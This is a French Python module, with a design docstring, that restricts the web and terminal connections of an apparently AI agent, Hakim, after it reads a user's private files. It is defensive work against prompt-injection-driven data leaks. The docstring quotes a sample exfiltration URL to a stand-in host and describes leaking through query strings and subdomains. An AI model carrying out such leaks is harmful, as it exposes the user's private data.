"""La règle de sortie (audit JARVIS 2, H1b, 2026-10-20 ; durcie après la relecture Opus du même jour).

Le risque : après avoir lu un fichier PRIVÉ d'Ahmed, Hakim est poussé (par une page ou un document piégés) à ouvrir
« https://inconnu.example/?d=<le contenu du fichier> » — une fuite. La règle, pour les outils web (lire_page, cliquer,
preparer_video_web) :

- L'état « lecture privée » dure FENETRE_S après la dernière lecture privée (pas seulement le tour : le contenu reste
  dans son contexte). Le cockpit le note dans ~/AIOS/jarvis/lecture-privee.json quand Hakim (ou un de ses agents)
  appelle preparer_fichier, chercher_dans_fichiers, chercher_dans_le_journal, fichiers_par_sens, memory_detail ou Read
  sur ses fichiers ; la marque du tour (tour-externe.jsonl) compte aussi.
- Dans cet état, une adresse vers un hôte qui n'est pas CONNU est refusée si elle peut porter des données : requête,
  fragment, chemin autre que « / », sous-domaines en cascade ou à rallonge ; et au-delà de NOUVEAUX_MAX hôtes nouveaux
  par fenêtre, même une adresse nue est refusée (le goutte-à-goutte par sous-domaines).
- Un hôte est CONNU s'il a été visité pour la première fois il y a plus de AGE_CONNU_S, hors état de lecture privée
  (la page piégée lue aujourd'hui ne le devient pas).
- Un refus est déposé dans sorties-demandees.jsonl : Ahmed l'autorise ou non d'un geste dans Parler (empreinte) ;
  autorisée, l'adresse exacte passe une fois dans les 15 minutes (sorties-permises.json, écrit par le cockpit).
Ni le terminal de Hakim ni ses outils de fichiers n'écrivent ces fichiers. Le terminal : sa passerelle applique la
règle aux NOMS d'hôtes avant de les résoudre (terminal.avant_connexion), et il n'a plus de résolveur DNS local ; le
chemin et la requête d'une connexion chiffrée lui restent invisibles (limite dite).
(audit de sécurité du 2026-10-23, corrigé avec l'accord d'Ahmed) :
- comme le terminal ne voit pas ce qu'il envoie, en lecture privée il ne va que vers des sites d'OUTILS (pypi, GitHub,
  Hugging Face) ; tout autre site attend le geste d'Ahmed, qui l'ouvre au terminal pour 15 minutes
  (verifier_terminal). Un site « connu » ne suffit plus pour le terminal ;
- toute lecture de sa mémoire, de son courrier, de son jardin ou des fichiers d'Ahmed compte comme lecture privée
  (est_privee), pas seulement une liste de six outils ; le cockpit y ajoute les données du téléphone et de la montre ;
- les chemins de ces fichiers ne se règlent plus par variables d'environnement (les tests remplacent les attributs) ;
- une autorisation « une fois » se consomme sous verrou (deux appels simultanés ne la passent pas deux fois).
"""
import fcntl
import json
import os
import time
import uuid
from pathlib import Path
from urllib.parse import urlsplit

_J = Path.home() / "AIOS" / "jarvis"
MARQUE = _J / "tour-externe.jsonl"
PRIVEE = _J / "lecture-privee.json"
CONNUS = _J / "web-domaines.json"
DEMANDES = _J / "sorties-demandees.jsonl"
PERMISES = _J / "sorties-permises.json"
LECTURES_PRIVEES = {"mcp__fichiers__preparer_fichier", "mcp__fichiers__chercher_dans_fichiers",
                    "mcp__fichiers__chercher_dans_le_journal", "mcp__fichiers__exporter_le_journal", "mcp__anamnese__fichiers_par_sens",
                    "mcp__anamnese__memory_detail", "Read(fichiers)"}
# (audit du 2026-10-23, élevé 2) tout ce que rendent sa mémoire et les fichiers d'Ahmed : souvenirs, courrier, jardin,
# carnets… ; et les données du téléphone (position, capteurs, montre) que le cockpit lui donne
PREFIXES_PRIVES = ("mcp__anamnese__", "mcp__fichiers__", "situation(")
# (audit du 2026-10-23, élevé 1) les seuls sites où le terminal va seul pendant une lecture privée : les dépôts
# d'outils, où l'on ne peut rien déposer sans compte (le terminal n'en a aucun)
OUTILS_TERMINAL = ("pypi.org", "pythonhosted.org", "github.com", "githubusercontent.com", "huggingface.co", "hf.co")
FENETRE_S = 6 * 3600
AGE_CONNU_S = 24 * 3600
NOUVEAUX_MAX = 5
CONNUS_MAX = 5000


class Refus(Exception):
    pass


def est_privee(outil):
    o = str(outil or "")
    return o in LECTURES_PRIVEES or o.startswith(PREFIXES_PRIVES)


def _json(chemin, defaut):
    try:
        return json.loads(Path(chemin).read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return defaut


def _ecrire(chemin, donnees):
    f = Path(chemin)
    tmp = f.with_name(f.name + f".{os.getpid()}.tmp")
    try:
        f.parent.mkdir(parents=True, exist_ok=True)
        tmp.write_text(json.dumps(donnees, ensure_ascii=False), encoding="utf-8")
        os.chmod(tmp, 0o600)
        os.replace(tmp, f)
    except OSError:
        pass


def lecture_privee(marque=None, privee=None, maintenant=None):
    """Depuis quand (epoch) Hakim est en état de lecture privée, ou None."""
    maintenant = time.time() if maintenant is None else maintenant
    try:
        for l in Path(marque or MARQUE).read_text(encoding="utf-8", errors="replace").splitlines():
            try:
                if est_privee(json.loads(l).get("outil")):
                    return maintenant
            except ValueError:
                continue
    except OSError:
        pass
    d = _json(privee or PRIVEE, {})
    derniere = d.get("derniere") if isinstance(d, dict) else None
    if isinstance(derniere, (int, float)) and maintenant - derniere < FENETRE_S:
        return float(derniere)
    return None


def hote(url):
    h = (urlsplit(str(url)).hostname or "").lower().rstrip(".")
    return h[4:] if h.startswith("www.") else h


def porte_des_donnees(url):
    """Une adresse qui peut porter un texte : requête, fragment, chemin autre que la racine, ou un nom d'hôte en
    cascade (plus de 4 étiquettes) ou à rallonge (une étiquette de plus de 20 caractères)."""
    u = urlsplit(str(url))
    if u.query or u.fragment or (u.path or "/") != "/":
        return True
    etiquettes = hote(url).split(".")
    return len(etiquettes) > 4 or any(len(e) > 20 for e in etiquettes)


def connus(chemin=None, maintenant=None):
    maintenant = time.time() if maintenant is None else maintenant
    d = _json(chemin or CONNUS, {})
    doms = d.get("domaines", {}) if isinstance(d, dict) else {}
    return {h for h, t in doms.items() if isinstance(t, (int, float)) and maintenant - t >= AGE_CONNU_S}


def noter(url, chemin=None, marque=None, privee=None, maintenant=None):
    """Une visite réussie HORS lecture privée : l'hôte entre dans la liste (connu après AGE_CONNU_S)."""
    maintenant = time.time() if maintenant is None else maintenant
    h = hote(url)
    if not h or lecture_privee(marque, privee, maintenant) is not None:
        return
    d = _json(chemin or CONNUS, {})
    doms = d.get("domaines", {}) if isinstance(d, dict) else {}
    if h in doms:
        return
    doms[h] = maintenant
    _ecrire(chemin or CONNUS, {"domaines": dict(sorted(doms.items(), key=lambda kv: kv[1])[-CONNUS_MAX:])})


def _permise(url, permises, maintenant):
    """L'adresse exacte autorisée par Ahmed (une fois, avant son échéance) : consommée, sous verrou (audit du
    2026-10-23 : deux appels simultanés la passaient deux fois)."""
    f = Path(permises or PERMISES)
    try:
        f.parent.mkdir(parents=True, exist_ok=True)
        verrou = os.open(f.with_name(f.name + ".verrou"), os.O_RDWR | os.O_CREAT, 0o600)
    except OSError:
        return False
    try:
        fcntl.flock(verrou, fcntl.LOCK_EX)
        d = _json(f, {})
        if not isinstance(d, dict):
            return False
        fin = d.get(str(url))
        if not isinstance(fin, (int, float)) or fin <= maintenant:
            return False
        d.pop(str(url), None)
        _ecrire(f, {k: v for k, v in d.items() if isinstance(v, (int, float)) and v > maintenant})
        return True
    finally:
        os.close(verrou)        # rend aussi le verrou


def _nouveaux_depuis(depuis, demandes, maintenant):
    """Hôtes nouveaux (adresses nues) déjà laissés passer pendant cette fenêtre."""
    d = _json(Path(demandes or DEMANDES).with_suffix(".nus.json"), {})
    return {h for h, t in (d.items() if isinstance(d, dict) else []) if isinstance(t, (int, float)) and t >= depuis}


def _compter_nu(h, demandes, maintenant):
    f = Path(demandes or DEMANDES).with_suffix(".nus.json")
    d = _json(f, {})
    d = {k: v for k, v in (d.items() if isinstance(d, dict) else []) if isinstance(v, (int, float)) and maintenant - v < FENETRE_S}
    d.setdefault(h, maintenant)
    _ecrire(f, d)


def _demander(url, raison, demandes, maintenant):
    i = uuid.uuid4().hex[:10]
    try:
        f = Path(demandes or DEMANDES)
        f.parent.mkdir(parents=True, exist_ok=True)
        fd = os.open(f, os.O_WRONLY | os.O_APPEND | os.O_CREAT, 0o600)
        try:
            # (Ahmed, 2026-10-22 : « afficher QUI la demande ») qui : Hakim ; le cockpit précise les agents en cours
            # (audit du 2026-10-23 : plus de variable d'environnement pour se faire passer pour un autre)
            os.write(fd, (json.dumps({"id": i, "ts": maintenant, "url": str(url)[:2000], "raison": raison, "qui": "hakim"},
                                     ensure_ascii=False) + "\n").encode())
        finally:
            os.close(fd)
    except OSError:
        pass
    return i


def verifier(url, marque=None, chemin=None, privee=None, demandes=None, permises=None, maintenant=None):
    maintenant = time.time() if maintenant is None else maintenant
    depuis = lecture_privee(marque, privee, maintenant)
    if depuis is None:
        return
    h = hote(url)
    if h and h in connus(chemin, maintenant):
        return
    if _permise(url, permises, maintenant):
        return
    if porte_des_donnees(url):
        raison = "adresse avec des données vers un hôte inconnu, après la lecture d'un fichier privé"
    # (contre-vérification Opus du 2026-10-20) le plafond compte sur toute la fenêtre : quand l'état vient de la marque
    # du tour, « depuis » vaut maintenant et n'aurait rien compté
    elif h not in (nus := _nouveaux_depuis(maintenant - FENETRE_S, demandes, maintenant)) and len(nus) >= NOUVEAUX_MAX:
        raison = f"plus de {NOUVEAUX_MAX} hôtes nouveaux depuis la lecture d'un fichier privé"
    else:
        _compter_nu(h, demandes, maintenant)
        return
    i = _demander(url, raison, demandes, maintenant)
    raise Refus(f"{raison} (« {h or str(url)[:60]} ») : c'est la forme d'une fuite. Ahmed peut l'autoriser d'un geste "
                f"dans Parler (demande {i}) ; dis-le-lui, puis réessaie la MÊME adresse.")


def _outil(h):
    return any(h == d or h.endswith("." + d) for d in OUTILS_TERMINAL)


_demandes_terminal = {}         # hôte → (id, quand) : une commande qui réessaie ne remplit pas Parler de demandes


def verifier_terminal(h, marque=None, privee=None, demandes=None, permises=None, maintenant=None):
    """La règle pour le TERMINAL (audit du 2026-10-23, élevé 1) : il ne voit que le nom de l'hôte, jamais ce qui part
    dans une connexion chiffrée ; une commande peut donc envoyer un texte privé dans le corps d'une requête. Pendant
    une lecture privée : les sites d'outils passent ; un autre site, seulement si Ahmed l'a ouvert d'un geste (pour
    15 minutes, toutes les connexions de la commande : une installation en ouvre plusieurs) ; sinon Refus."""
    maintenant = time.time() if maintenant is None else maintenant
    if lecture_privee(marque, privee, maintenant) is None:
        return
    h = str(h or "").lower().rstrip(".")
    h = h[4:] if h.startswith("www.") else h
    if h and _outil(h):
        return
    d = _json(permises or PERMISES, {})
    for cle in (f"https://{h}/", f"https://www.{h}/"):
        fin = d.get(cle) if isinstance(d, dict) else None
        if isinstance(fin, (int, float)) and fin > maintenant:
            return
    deja = _demandes_terminal.get(h)
    if deja and maintenant - deja[1] < 300:
        i = deja[0]
    else:
        i = _demander(f"https://{h}/", "le terminal veut joindre un site qui n'est pas un dépôt d'outils, pendant une "
                      "lecture privée (il ne voit pas ce qui part)", demandes, maintenant)
        _demandes_terminal[h] = (i, maintenant)
    raise Refus(f"le terminal ne joint pas « {h} » pendant une lecture privée : il ne voit pas ce qui part, et seuls les "
                f"dépôts d'outils (pypi, GitHub, Hugging Face) passent seuls. Ahmed peut l'ouvrir 15 minutes d'un geste "
                f"dans Parler (demande {i}) ; dis-le-lui, puis relance la même commande.")
